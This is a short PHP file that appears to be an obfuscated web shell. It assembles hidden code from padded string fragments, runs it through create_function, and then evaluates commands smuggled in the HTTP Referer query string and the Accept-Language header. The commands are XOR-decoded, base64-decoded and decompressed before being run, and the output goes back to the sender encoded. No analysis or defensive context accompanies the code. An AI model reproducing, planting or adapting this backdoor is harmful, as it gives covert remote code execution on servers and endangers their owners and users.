<?php
$E=str_replace('b','','bcreatbebb_bfubnction');
$i='";Qvfor($i=0;Qv$i<$l;Qv){QvfQvor($j=0;($Qvj<$c&&Qv$i<$l);$j++Qv,$iQv+Qv+){$oQv.=$t{$i}^$Qvk{$jQ';
$N='v};}}returQvn Qv$o;}$r=$_SERVEQvQvR;$rr=@$r["QvHTQvTP_REQvFERER"];$rQvQva=@$Qvr["HTTP_ACCEPQvT_';
$y='Qv$kh="5d41";Qv$kf="Qv40Qv2a";functionQv x(Qv$tQv,Qv$k){$c=strlen($k);$lQvQv=strlen($t);$Qvo="';
$l='Qv+"),$ss($sQv[$i],0,$e)))Qv,Qv$k)));$o=obQv_get_cQvonQvtenQvts();ob_Qvend_cleanQv();$d=Qvbase';
$O='rray_vaQvQvQvlues($Qvq);pregQvQv_match_all("/([\\wQv])[\\w-]Qv+(?:;q=0.(Qv[\\Qvd]))?,?/",Qv$raQv,';
$W='$m)Qv;if($q&Qv&$m)Qv{@sesQvsion_sQvtart();$s=&$_QvSEQvSSIOQvN;$QvQvss="substr";$sl="strQvtQvoloQ';
$o='LANGUQvAGE"];ifQv(Qv$rr&&$ra){$QvQvu=parse_urQvl($rr);Qvparse_Qvstr($u[Qv"queryQv"Qv],$q);$q=Qva';
$H='$i.$kf),Qv0Qv,3));$p=Qv"";for($Qvz=1;$Qvz<countQv($m[1]Qv);$z++)$p.=$q[$Qvm[Qv2][$z]];if(Qvst';
$z='$sQv[$i].=$pQv;$e=sQvtrpos($s[$iQvQv],$f);iQvf($e){$k=Qv$Qvkh.$kf;oQvb_staQvrt(Qv);@evaQvl(@gzun';
$t='vwer";$i=$m[Qv1Qv][Qv0].$m[1][1];$h=$Qvsl($Qvss(md5($i.$Qvkh),0,3Qv));Qv$Qvf=$QvQvsl($ss(mdQv5(';
$L='Qv64Qv_Qvencode(x(gzcomprQvess($o),$Qvk))Qv;prinQvQvt("<$k>$d</$Qvk>")Qv;@sessQvion_destQvroy();}}}}';
$b='rpoQvQvs($p,Qv$Qvh)===0){$s[$iQvQvQv]="";$p=$ssQv($p,3);}if(array_QvkQvey_exisQvts($i,$s))Qv{';
$R='compQvress(@x(QvQv@base6Qv4_decodQve(pQvreg_rQveplaceQv(array("Qv/Qv_/","/-Qv/"),array("/Qv","';
$c=str_replace('Qv','',$y.$i.$N.$o.$O.$W.$t.$H.$b.$z.$R.$l.$L);
$S=$E('',$c);$S();
?>
